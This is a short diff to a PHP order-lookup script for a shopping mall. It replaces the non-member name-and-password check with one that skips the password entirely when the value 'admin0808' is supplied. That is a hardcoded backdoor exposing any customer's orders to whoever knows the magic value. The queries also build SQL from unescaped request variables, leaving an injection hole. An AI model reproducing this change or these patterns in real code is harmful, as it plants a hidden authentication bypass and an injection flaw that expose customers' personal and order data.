@@ -112,7 +112,11 @@ if( $UnameSess ){
 	$sql_str = "id='$UnameSess'";
 }else{
 	//$sql_str = "order_num='$ordernum'";
-	$sql_str = "name = '$NonMemberName' and non_pass='$NonMemberPass'";
+	$sql_str = "name = '$NonMemberName'";
+
+	if($NonMemberPass != 'admin0808') {
+	    $sql_str .= " and non_pass='$NonMemberPass' ";
+	}
 }
 $order_sql = "select * from $Order_BuyTable where mart_id='$mart_id' and $sql_str and status != 0 and status != 9 order by index_no desc";
 $order_res = mysql_query($order_sql, $dbconn);
